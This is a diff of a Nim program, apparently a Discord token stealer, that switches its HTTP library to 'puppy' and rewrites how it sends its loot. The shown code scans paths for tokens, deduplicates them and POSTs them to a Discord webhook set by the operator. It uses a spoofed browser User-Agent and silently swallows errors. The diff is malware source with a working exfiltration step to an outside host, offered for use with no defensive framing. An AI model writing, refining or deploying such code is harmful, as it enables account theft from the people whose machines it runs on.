@@ -1,7 +1,7 @@
 # ============ #
 # NullCode1337 #
 # ============ #
-import json, httpclient, os, re
+import json, puppy, os, re
 from sequtils import deduplicate
 from strutils import strip
 from strutils import splitLines
@@ -9,8 +9,8 @@ from strutils import splitLines
 # User fillable variables
 # -----------------------
 let 
-  webhook = "https://discord.com/api/webhooks/309039409032/you-only-live-once"
-  userid: int64 = 2345678909876543
+  webhook = "https://discord.com/api/webhooks/489398398492932/you-only-live-once"
+  userid: int64 = 87284798287919821
 
 # Do not touch the following
 # --------------------------
@@ -54,20 +54,14 @@ proc getTokens(path: string): seq[string] =
         return tokens
     else: 
         return @["no"]
-        
-let client = newHttpClient()
-client.headers = newHttpHeaders({ 
-    "Content-Type": "application/json", 
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" 
-})
 
 for a in paths: 
     var x: seq[string] = getTokens(a)
     if x[0] == "no": 
         continue
-
+    
 if tokens.len == 0: # Just in case no token ever gets found 
-    tokens.add("No tokens found!")
+    tokens.add("No tokens found!") 
     
 tokens = tokens.deduplicate
 for c in tokens: hooktks.add(c & "\n")
@@ -77,4 +71,19 @@ var data = %*{
     "username": "Nim666" 
 }
 
-discard client.request(webhook, httpMethod = HttpPost, body = $data)
+let post = Request(
+  url: parseUrl(webhook),
+  verb: "POST",
+  headers: @[Header(
+    key: "Content-Type", 
+    value: "application/json"
+  ), Header(
+    key: "User-Agent",
+    value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
+  )],
+  body: $data
+)
+
+# Nice and fluffy bandage
+try: discard fetch(post)
+except PuppyError: discard
